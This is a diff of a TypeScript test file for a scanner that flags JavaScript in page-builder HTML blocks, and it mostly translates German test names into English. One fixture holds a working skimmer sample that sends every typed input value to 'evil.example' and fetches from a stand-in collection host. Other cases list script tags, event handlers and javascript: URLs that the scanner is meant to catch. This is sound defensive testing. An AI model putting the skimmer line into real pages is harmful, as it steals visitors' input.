@@ -2,7 +2,7 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { scriptRisk, scriptRiskText, withScript } from '../../src/lib/script-scan';
 
-test('scriptRisk: Skimmer im custom-html-Block wird mit Zieladressen erkannt', () => {
+test('scriptRisk: skimmer in a custom-html block is detected with target addresses', () => {
   const spec = { sections: [{ blocks: [{ type: 'custom-html', html: '<div>Angebot</div>', css: '.scope{color:red}', js: "document.addEventListener('input',e=>navigator.sendBeacon('https://evil.example/c',e.target.value));fetch('//collect.bad-cdn.net/x')" }] }] };
   const r = scriptRisk(spec);
   assert.ok(r); assert.deepEqual(r.kinds, ['js']);
@@ -10,7 +10,7 @@ test('scriptRisk: Skimmer im custom-html-Block wird mit Zieladressen erkannt', (
   assert.match(scriptRiskText(r), /enthält JavaScript.*evil\.example/);
 });
 
-test('scriptRisk: <script>, Event-Handler, javascript:-URL (auch kodiert), externes Skript, iframe/Formular', () => {
+test('scriptRisk: <script>, event handler, javascript: URL (also encoded), external script, iframe/form', () => {
   const k = (h: string) => scriptRisk({ html: h })?.kinds ?? [];
   assert.deepEqual(k('<p>x</p><script src="https://cdn.track.io/a.js"></script>'), ['script']);
   assert.deepEqual(scriptRisk('<script src="https://cdn.track.io/a.js"></script>')?.hosts, ['cdn.track.io']);
@@ -24,12 +24,12 @@ test('scriptRisk: <script>, Event-Handler, javascript:-URL (auch kodiert), exter
   assert.deepEqual(k('<SCRIPT>x()</SCRIPT>'), ['script']);
 });
 
-test('scriptRisk: harmloser Inhalt bleibt still (JSON-LD, Bilder vom CDN, Links, Text mit „on“)', () => {
+test('scriptRisk: harmless content stays quiet (JSON-LD, CDN images, links, text with "on")', () => {
   for (const h of ['<p>Bonus=gratis, Saison: Sommer</p>', '<a href="https://partner.example/">Partner</a>', '<img src="https://cdn.shop.example/a.jpg" alt="Vase">',
     '<script type="application/ld+json">{"@type":"FAQPage","url":"https://x.example"}</script>', '<div style="background:url(https://cdn.example/b.jpg)">x</div>', '<p>Lesen Sie: Javascript ist toll</p>'])
     assert.equal(scriptRisk({ html: h }), null, h);
   assert.equal(scriptRisk({ js: '  ' }), null);
   assert.deepEqual(withScript({ html: '<p>x</p>' }), {});
-  // Ladeadressen werden nur zusammen mit JS gemeldet, dann aber vollständig (Bild, Stylesheet)
+  // Load addresses are only reported together with JS, but then completely (image, stylesheet)
   assert.deepEqual(scriptRisk({ html: '<img src="https://pixel.example/p.gif"><link rel="stylesheet" href="//fonts.example/c.css"><script>1</script>' })?.hosts, ['fonts.example', 'pixel.example']);
 });
